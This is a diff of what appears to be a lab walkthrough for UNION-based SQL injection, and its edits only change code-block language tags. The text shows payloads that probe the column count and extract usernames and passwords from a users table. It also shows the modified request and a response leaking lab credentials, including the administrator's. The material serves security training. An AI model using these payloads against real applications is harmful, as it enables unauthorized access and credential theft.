@@ -28,14 +28,14 @@
 1. **Determine the Number of Columns**:
    *   Modify the category filter request to test for the number of columns:
 
-       ```plaintext
+       ```sql
        '+UNION+SELECT+'abc','def'--
        ```
    * Identify how many columns accept string values.
 2. **Retrieve Data from Users Table**:
    *   Inject the following payload to extract usernames and passwords:
 
-       ```plaintext
+       ```sql
        '+UNION+SELECT+username,+password+FROM+users--
        ```
 3. **Extract Admin Credentials**:
@@ -48,14 +48,14 @@
 1. **Intercept the Request**:
    *   Identify the GET request:
 
-       ```plaintext
+       ```html
        GET /filter?category=Clothing%2c+shoes+and+accessories
        ```
    * Modify the `category` parameter to inject a UNION-based SQL query.
 2. **Craft the Payload**:
    *   Use the following injection:
 
-       ```plaintext
+       ```sql
        1' UNION SELECT username, password FROM users --
        ```
    *   The full request becomes:
@@ -66,7 +66,7 @@
 3. **Extract the Results**:
    *   Application responds with user credentials:
 
-       ```html
+       ```xml
        <tr><th>wiener</th><td>e0rhde6r01n2svvmpp42</td></tr>
        <tr><th>carlos</th><td>nd76dn00fy7xpm8m1ghe</td></tr>
        <tr><th>administrator</th><td>r08fng6gvgdcoxnsfsj5</td></tr>
